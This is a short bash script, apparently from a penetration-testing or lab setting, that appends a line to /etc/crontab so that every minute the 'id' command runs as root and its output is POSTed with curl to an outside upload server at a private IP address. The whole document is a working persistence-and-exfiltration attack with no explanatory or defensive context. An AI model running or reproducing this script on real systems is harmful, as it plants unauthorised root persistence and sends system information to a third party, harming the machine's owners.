#!/bin/bash
# Injects cron job to exfil command output periodically

DEST="http://10.11.0.123:8000/upload"

echo "* * * * * root id | curl -X POST -F file=@- $DEST" >> /etc/crontab
